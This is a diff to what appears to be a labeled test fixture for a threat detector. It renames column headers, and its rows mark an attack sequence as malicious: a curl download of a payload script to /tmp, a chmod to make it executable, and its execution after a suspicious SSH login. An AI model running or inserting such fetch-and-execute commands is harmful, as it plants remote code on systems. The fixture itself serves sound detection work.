@@ -1,4 +1,4 @@
-Time|Case|Host|User|SourceIP|Command|Context|Expected
+LegacyTime|LegacyCaseID|Host|User|SourceIP|Command|LegacyContext|Expected
 09:00:01|ATTACK|linux-web-01|user|198.51.100.77|curl http://198.51.100.200/payload.sh -o /tmp/update.sh|after suspicious SSH login|malicious
 09:00:10|ATTACK|linux-web-01|user|198.51.100.77|chmod +x /tmp/update.sh|after suspicious SSH login|malicious
 09:00:15|ATTACK|linux-web-01|user|198.51.100.77|/tmp/update.sh|after suspicious SSH login|malicious
